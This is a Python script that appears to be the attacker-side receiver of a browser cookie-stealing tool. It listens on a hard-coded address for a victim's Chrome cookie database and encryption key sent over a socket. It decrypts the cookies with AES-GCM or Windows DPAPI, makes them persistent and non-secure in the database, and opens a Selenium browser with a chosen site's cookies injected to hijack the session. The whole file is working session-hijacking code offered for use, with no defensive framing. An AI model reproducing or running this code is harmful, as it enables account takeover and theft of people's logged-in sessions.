from datetime import datetime, timedelta
from selenium import webdriver
from Crypto.Cipher import AES
import win32crypt
import paramiko
import base64
import sqlite3
import shutil
import socket
import pickle
import signal
import struct
import time
import json
import sys
import os
import io



# detect Ctrl-C
def signal_handler(sig, frame):
    # Add any cleanup code here if needed
    exit(0)

# start detect Ctrl-C function
signal.signal(signal.SIGINT, signal_handler)




# receive cookie file and key file from victim
def receive_files():
    ip_address = '192.168.1.194'  # Replace with the server's IP address
    port = 80  # Replace with the port you want to listen on

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # Set SO_REUSEADDR option
    server_socket.bind((ip_address, port))
    server_socket.listen(1)

    print("Listening for incoming connections on {}:{}".format(ip_address, port))

    try:
        client_socket, client_address = server_socket.accept()
        print("Accepted connection from {}:{}".format(client_address[0], client_address[1]))

        # Receive the cookies file
        cookies_size_bytes = client_socket.recv(4)
        cookies_size = struct.unpack('I', cookies_size_bytes)[0]
        cookies_data = b''
        while len(cookies_data) < cookies_size:
            cookies_data += client_socket.recv(cookies_size - len(cookies_data))

        cookies_file = 'files/Cookies.db'
        with open(cookies_file, 'wb') as file:
            file.write(cookies_data)

        print("Received {} successfully.".format(cookies_file))

        # Receive the key file
        key_size_bytes = client_socket.recv(4)
        key_size = struct.unpack('I', key_size_bytes)[0]
        key_data = b''
        while len(key_data) < key_size:
            key_data += client_socket.recv(key_size - len(key_data))

        key_file = 'files/encryption_key.bin'
        with open(key_file, 'wb') as file:
            file.write(key_data)

        print("Received {} successfully.".format(key_file))

        client_socket.close()

    except KeyboardInterrupt:
        print("\nKeyboard interrupt received. Exiting...")
        sys.exit(0)

    finally:
        server_socket.close()



# open session in browser with selenium
def open_session(target_cookies, cookies, site):
    browser = webdriver.Chrome()
    if site[0] == ".":
        site = site[1:]
    browser.get("https://" + site)
    for cookie in target_cookies:
        browser.add_cookie(cookie)
    browser.refresh()
    
    while True:
    # Check if the browser window is still open
        if not browser.window_handles:
            break

    os.system('cls')
    print('\n\n')
    # return to list
    list_and_attack(cookies)



# filter cookie list based on site
def filter_cookies(cookies, site):
    target_cookies = [cookie for cookie in cookies if cookie['host_key'] == site]
    return [{k: v for k, v in cookie.items() if k in ['name', 'value']} for cookie in target_cookies]



# get list of all sites
def get_site_list(cookies):
    session_list = {cookie['host_key'] for cookie in cookies}
    return session_list



# decrypt data with key
def decrypt_data(data, key):
    try:
        # get the initialization vector
        iv = data[3:15]
        data = data[15:]
        # generate cipher
        cipher = AES.new(key, AES.MODE_GCM, iv)
        # decrypt password
        return cipher.decrypt(data)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(data, None, None, None, 0)[1])
        except:
            # not supported
            return "Decryption method not supported"


# display site list & select session to hijack
def list_and_attack(cookies):
    print(' SESSION COOKIES\n')
    session_list = sorted(get_site_list(cookies))
    for item in session_list:
        print(' ' + item)
    site = input('\n\n Select session: ')
    print('\n\n Using Cookies:\n\n')
    for item in filter_cookies(cookies, site):
        print(' ' + f"{item['name']}: {item['value']}")
    print('\n\n Hijacking session: ' + site + '\n\n')
    target_cookies = filter_cookies(cookies, site)
    open_session(target_cookies, cookies, site)



def main():


    # Call the download_files function
    receive_files()
    



    print('\n- Decrypting Cookies\n\n\n')

    filename = "files/Cookies.db"
    # connect to the database
    db = sqlite3.connect(filename)
    # ignore decoding errors
    db.text_factory = lambda b: b.decode(errors="ignore")
    cursor = db.cursor()
    
    # get all cookies from cookie table'
    cursor.execute("""
    SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value 
    FROM cookies""")
    
    # read the key from the file
    with open('files/encryption_key.bin', 'rb') as f:
        key = f.read()
    
    # initialise cookie list
    cookie_list = []

    for row in cursor.fetchall():
        cookie = {}  # create a new dictionary for each row
        host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value = row

        # if not decrypted
        if not value:
            # then decrypt
            decrypted_value = decrypt_data(encrypted_value, key)

        else:
            # if already decrypted
            decrypted_value = value

        # add each column to the cookie dictionary
        cookie['host_key'] = host_key
        cookie['name'] = name
        cookie['value'] = decrypted_value
        cookie['creation_utc'] = creation_utc
        cookie['last_access_utc'] = last_access_utc
        cookie['expires_utc'] = expires_utc
        
        # append the cookie list to the master list (list of lists)
        cookie_list.append(cookie)
    
        # update the cookies table with the decrypted value
        # and make session cookie persistent
        cursor.execute("""
        UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999, is_persistent = 1, is_secure = 0
        WHERE host_key = ?
        AND name = ?""", (decrypted_value, host_key, name))

    # commit changes
    db.commit()
    # close connection
    db.close()

    # call attack function
    list_and_attack(cookie_list)





# CALL MAIN FUNCTION 
if __name__ == "__main__":
    main()